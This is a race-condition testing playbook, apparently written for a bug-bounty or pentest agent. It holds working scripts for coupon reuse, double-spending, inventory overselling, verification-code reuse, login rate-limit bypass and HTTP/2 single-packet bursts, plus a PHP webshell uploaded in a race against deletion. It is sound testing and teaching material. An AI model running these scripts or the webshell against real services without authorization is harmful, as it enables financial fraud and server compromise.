> Structure: the original material in the first half is the main path (payments / coupons / inventory); the second half adds depth (HTTP/2 single-packet attacks, Turbo Intruder). Read the original payment / coupon race material first, then open the additions for single-packet techniques.
>
> If anything conflicts with `src-value-hunting`, follow the rules. Report concurrent verification-code attacks only when they complete login / password reset; do not report SMS flooding by itself.

## 1. Existing knowledge base

# Race Condition Testing Guide

## 1. How race conditions work

### TOCTOU (Time-of-Check to Time-of-Use)

```
Normal flow:
1. Check a condition (for example, whether the balance is sufficient)
2. Perform an operation (deduct the funds)

Race condition:
Thread A: check balance 100 → deduct 50
Thread B: check balance 100 → deduct 50
Result: the balance should be 0, but may actually be 50 or -50
```

If object storage is configured to fetch from origin when an object is missing, and the existence check is separate from the actual download, concurrent PUT and DELETE requests for the same key may bypass the “check whether the object exists first” step. See “COS origin-fetch race” in `ssrf-test.md`. **Test only if origin fetch is observed**; this is not required at every site.

---

## 2. Identify high-risk scenarios

### 2.1 Claiming coupons / red packets

```python
# Obtain a one-time resource more than once
# Scenario: one coupon per account, but concurrent requests may claim it multiple times

import requests
import threading

url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

def claim():
    r = requests.post(url, headers=headers, json=data)
    print(r.json())

# Send 50 concurrent requests
threads = [threading.Thread(target=claim) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# Check whether the account received multiple coupons
```

### 2.2 Spending balance / points (double spending)

```python
# Scenario: balance is 100; submit two purchases of 100 at the same time

import asyncio
import aiohttp

async def consume(session):
    async with session.post(
        "https://target.com/api/pay",
        headers={"Authorization": "Bearer TOKEN"},
        json={"amount": 100}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [consume(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())

# Check whether spending exceeded the balance
```

### 2.3 Voting / likes (duplicate counts)

```bash
# Scenario: one vote per person, but concurrent requests may submit multiple votes

for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"targetId": "123"}' &
done
wait

# Check whether the target vote count increased by more than one
```

### 2.4 File upload followed by deletion

```python
# Scenario: upload a webshell → the system detects it as malicious → deletes it
# Test: access it concurrently immediately after upload, before deletion

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("Executed successfully:", r.text)
            break

# Thread 1 uploads; thread 2 repeatedly accesses it
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### 2.5 Limited-sale purchase (overselling inventory)

```python
# Scenario: inventory is 10, but 100 users submit orders simultaneously

import requests
import threading

def buy():
    r = requests.post("https://target.com/api/order/create",
        headers={"Authorization": "Bearer TOKEN"},
        json={"goodsId": "LIMITED_ITEM", "count": 1})
    print(r.json())

threads = [threading.Thread(target=buy) for _ in range(100)]
[t.start() for t in threads]
[t.join() for t in threads]

# Check whether more than 10 orders succeeded
```

### 2.6 Verification-code validation

```python
# Scenario: a verification code becomes invalid after validation, but concurrent submissions may bypass this

import requests
import threading

code = "123456"  # Verification code obtained

def submit():
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": code})
    print(r.json())

# Submit the same verification code concurrently
threads = [threading.Thread(target=submit) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## 3. Testing tools and methods

### 3.1 HTTP/2 single-packet attack (Single Packet Attack)

**Principle**: HTTP/2 multiplexing allows multiple requests to be sent in one TCP packet, reducing network jitter so the requests reach the server at nearly the same time.

#### Using h2load

```bash
# Install h2load (nghttp2)
# Ubuntu: apt install nghttp2-client
# macOS: brew install nghttp2

# Send 50 concurrent requests over one connection, with up to 50 streams per connection
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"couponId":"NEWUSER100"}' \
  -H "Content-Type: application/json" \
  https://target.com/api/coupon/claim

# Parameter descriptions:
# -n: Total number of requests
# -c: Concurrent connections (set to 1 for a single packet)
# -m: Maximum concurrent streams per connection
# -d: POST data
# -H: Request headers
```

#### Python httpx implementation

```python
import httpx
import asyncio

async def single_packet_attack():
    """HTTP/2 single-packet attack"""
    url = "https://target.com/api/coupon/claim"
    headers = {
        "Authorization": "Bearer TOKEN",
        "Content-Type": "application/json"
    }
    data = {"couponId": "NEWUSER100"}
    
    # Use HTTP/2
    async with httpx.AsyncClient(http2=True) as client:
        # Send requests concurrently over the same connection
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        
        for i, resp in enumerate(responses):
            print(f"Request {i+1}: {resp.status_code} - {resp.text}")

asyncio.run(single_packet_attack())
```

### 3.2 Turbo Intruder (Burp extension)

```python
# Burp → Extender → BApp Store → Turbo Intruder

# Example script (for use in Turbo Intruder)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req)
    
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Python asyncio + aiohttp

```python
import asyncio
import aiohttp
import time

async def race_condition_test(url, headers, data, count=50):
    """Generic race-condition test"""
    
    async def send_request(session, index):
        start = time.time()
        async with session.post(url, headers=headers, json=data) as resp:
            elapsed = time.time() - start
            result = await resp.json()
            return {
                "index": index,
                "status": resp.status,
                "elapsed": elapsed,
                "result": result
            }
    
    # Create a connection pool and reuse connections
    connector = aiohttp.TCPConnector(limit=1, limit_per_host=1)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Warm up the connections
        await session.post(url, headers=headers, json=data)
        
        # Send concurrently
        tasks = [send_request(session, i) for i in range(count)]
        results = await asyncio.gather(*tasks)
        
        return results

# Example usage
url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

results = asyncio.run(race_condition_test(url, headers, data, 50))

# Analyze the results
success_count = sum(1 for r in results if r['status'] == 200)
print(f"Successful requests: {success_count}/50")

# Check response-time distribution (closer times indicate greater concurrency)
times = [r['elapsed'] for r in results]
print(f"Fastest: {min(times):.3f}s, slowest: {max(times):.3f}s, average: {sum(times)/len(times):.3f}s")
```

### 3.4 curl concurrency

```bash
# Basic concurrency (more network jitter and less effective)
for i in $(seq 1 50); do
  curl -X POST "https://target.com/api/coupon/claim" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"couponId":"NEWUSER100"}' &
done
wait

# Use GNU Parallel (better concurrency control)
seq 1 50 | parallel -j 50 \
  'curl -X POST "https://target.com/api/coupon/claim" \
   -H "Authorization: Bearer TOKEN" \
   -H "Content-Type: application/json" \
   -d "{\"couponId\":\"NEWUSER100\"}"'
```

---

## 4. Confirmation criteria

### How to confirm a race condition

#### 4.1 Balance / points change

```python
# Record the balance before testing
before = get_balance()

# Run the race-condition test
race_condition_test(...)

# Check the balance after testing
after = get_balance()

# Assess the result
if before - after > expected_deduction:
    print("Race condition confirmed: abnormal deduction")
```

#### 4.2 Duplicate records

```sql
-- Check whether the database contains duplicate records
SELECT coupon_id, user_id, COUNT(*) as count
FROM user_coupons
WHERE user_id = 'TEST_USER'
GROUP BY coupon_id, user_id
HAVING count > 1;
```

#### 4.3 Inventory anomalies

```python
# Check whether the number of orders exceeds inventory
orders = get_orders(goods_id="LIMITED_ITEM")
stock = get_stock(goods_id="LIMITED_ITEM")

if len(orders) > stock:
    print(f"Inventory oversold: stock={stock}, orders={len(orders)}")
```

#### 4.4 Analyze response content

```python
# Analyze all responses
results = race_condition_test(...)

success_responses = [r for r in results if r['status'] == 200]
print(f"Successful responses: {len(success_responses)}")

# Check business status codes in the responses
business_success = [r for r in success_responses 
                   if r['result'].get('code') == 0]
print(f"Business successes: {len(business_success)}")

# If business successes > 1 for a one-time resource, a race condition exists
```

---

## 5. WooYun field examples

### 5.1 Payment scenario

```python
# Example: balance is 100; submit two payments of 100 simultaneously
# Expected: the second payment fails
# Actual: both succeed and the balance becomes -100

async def double_spend_attack():
    url = "https://target.com/api/pay"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {"orderId": "ORDER123", "amount": 100}
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, headers=headers, json=data),
            session.post(url, headers=headers, json=data)
        ]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

### 5.2 Coupon scenario

```python
# Example: use the same coupon concurrently multiple times
# Expected: it can be used only once
# Actual: it was used 10 times

async def coupon_reuse_attack():
    url = "https://target.com/api/order/create"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {
        "goodsId": "ITEM123",
        "couponId": "DISCOUNT50"  # 50-unit coupon
    }
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, json=data) 
                for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.status == 200)
        print(f"Coupon used successfully {success} times")
```

### 5.3 Check-in / points scenario

```python
# Example: concurrent check-ins award multiple points
# Expected: one daily check-in awards 10 points
# Actual: 20 concurrent check-ins award 200 points

async def checkin_race():
    url = "https://target.com/api/checkin"
    headers = {"Authorization": "Bearer TOKEN"}
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

---

## 6. Advanced techniques

### 6.1 Delayed release (Delay Release)

```python
# Insert a delay between checking and execution to widen the race window

# Server-side pseudocode:
# balance = get_balance(user_id)
# if balance >= amount:
#     time.sleep(0.1)  # Artificial delay
#     deduct_balance(user_id, amount)

# Test: send multiple requests within this 0.1-second window
```

### 6.2 Connection reuse

```python
# Reuse TCP connections to reduce handshake time and increase concurrency

import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
session.mount('https://', adapter)

# Send all requests over the same connection
for _ in range(50):
    session.post(url, headers=headers, json=data)
```

### 6.3 Probe the timing window

```python
# Measure operation duration first to find the best race window

import time

def measure_timing():
    times = []
    for _ in range(10):
        start = time.time()
        requests.post(url, headers=headers, json=data)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_time = sum(times) / len(times)
    print(f"Average response time: {avg_time:.3f}s")
    
    # If response time > 100 ms, the race window is relatively large
    return avg_time

# Adjust concurrency based on response time
avg_time = measure_timing()
if avg_time > 0.1:
    concurrent_count = 100  # Large window: increase concurrency
else:
    concurrent_count = 20   # Small window: reduce concurrency
```

---

## 7. Check for race-condition protections

```python
# Check whether race-condition protections exist

# 1. Database lock (pessimistic locking)
# Characteristic: later concurrent requests wait for the earlier request to finish
# Check: observe whether response times increase in steps

# 2. Optimistic lock (version number)
# Characteristic: only one concurrent request succeeds; others return "version conflict"
# Check: inspect error messages in failed responses

# 3. Distributed lock (Redis)
# Characteristic: similar to a database lock
# Check: analyze response times

# 4. Idempotency design
# Characteristic: duplicate requests return the same result without side effects
# Check: send the same request multiple times and compare results
```

---

## 9. Notes

1. **Scope:** test only with your own test account; do not affect other users
2. **Intensity:** keep concurrency modest (recommended ≤ 50) to avoid DoS
3. **Data recovery:** check the account state after testing and report anomalies promptly
4. **PoC evidence:** save before / after balance or points screenshots and all request / response pairs

---

## 2. Additions: race-condition

### race-condition

### Race Conditions — Testing & Exploitation Playbook


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `logic-test.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`logic-test.md`).
